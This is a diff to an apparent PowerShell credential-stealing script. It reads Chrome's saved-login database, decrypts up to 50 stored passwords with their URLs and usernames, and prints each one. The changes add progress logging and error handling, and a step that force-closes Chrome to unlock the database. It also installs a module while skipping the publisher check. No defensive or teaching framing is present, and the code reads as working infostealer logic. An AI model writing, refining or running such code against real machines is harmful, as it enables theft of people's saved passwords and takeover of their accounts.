@@ -150,19 +150,31 @@ function Get-ChromePasswords {
         # Check if PSSQLite is installed
         if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
             Write-Host "      Installing PSSQLite module..." -ForegroundColor Yellow
-            Install-Module -Name PSSQLite -Force -Scope CurrentUser -SkipPublisherCheck -ErrorAction Stop
+            try {
+                Install-Module -Name PSSQLite -Force -Scope CurrentUser -SkipPublisherCheck -ErrorAction Stop
+                Write-Host "      PSSQLite installed successfully" -ForegroundColor Green
+            } catch {
+                Write-Host "      Failed to install PSSQLite: $($_.Exception.Message)" -ForegroundColor Red
+                throw "PSSQLite installation failed"
+            }
         }
         
         Import-Module PSSQLite -ErrorAction Stop
+        Write-Host "      PSSQLite loaded" -ForegroundColor Green
         
         # Query the database
         $query = "SELECT origin_url, username_value, password_value FROM logins WHERE LENGTH(password_value) > 0 ORDER BY date_last_used DESC LIMIT 50"
-        $results = Invoke-SqliteQuery -DataSource $tempDB -Query $query
+        Write-Host "      Querying database..." -ForegroundColor Yellow
+        
+        $results = Invoke-SqliteQuery -DataSource $tempDB -Query $query -ErrorAction Stop
+        Write-Host "      Found $($results.Count) entries in database" -ForegroundColor Green
         
         foreach ($row in $results) {
             $url = $row.origin_url
             $username = $row.username_value
             $encryptedPassword = [byte[]]$row.password_value
+            
+            Write-Host "      Processing: $url" -ForegroundColor Gray
             
             if ($encryptedPassword -and $encryptedPassword.Length -gt 0) {
                 $password = Decrypt-ChromePassword -EncryptedPassword $encryptedPassword -Key $key
@@ -173,6 +185,9 @@ function Get-ChromePasswords {
                         Username = $username
                         Password = $password
                     }
+                    Write-Host "      ✓ Decrypted password for $url" -ForegroundColor Green
+                } else {
+                    Write-Host "      ✗ Failed to decrypt $url" -ForegroundColor Red
                 }
             }
         }
@@ -180,6 +195,7 @@ function Get-ChromePasswords {
         Write-Host "      Successfully extracted $($passwords.Count) passwords" -ForegroundColor Green
         
     } catch {
+        Write-Host "      Error: $($_.Exception.Message)" -ForegroundColor Red
         Write-Host "      PSSQLite unavailable, using fallback method" -ForegroundColor Yellow
         
         # Fallback: Parse SQLite database manually (basic extraction)
@@ -231,6 +247,16 @@ Write-Host "      User: $user" -ForegroundColor Green
 
 # Extract Chrome passwords
 Write-Host "`n[3/4] Extracting Chrome passwords..." -ForegroundColor Yellow
+
+# Close Chrome if running to unlock database
+Write-Host "      Checking if Chrome is running..." -ForegroundColor Yellow
+$chromeProcesses = Get-Process chrome -ErrorAction SilentlyContinue
+if ($chromeProcesses) {
+    Write-Host "      Closing Chrome..." -ForegroundColor Yellow
+    Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2
+}
+
 $allPasswords = Get-ChromePasswords
 
 if ($allPasswords.Count -gt 0) {
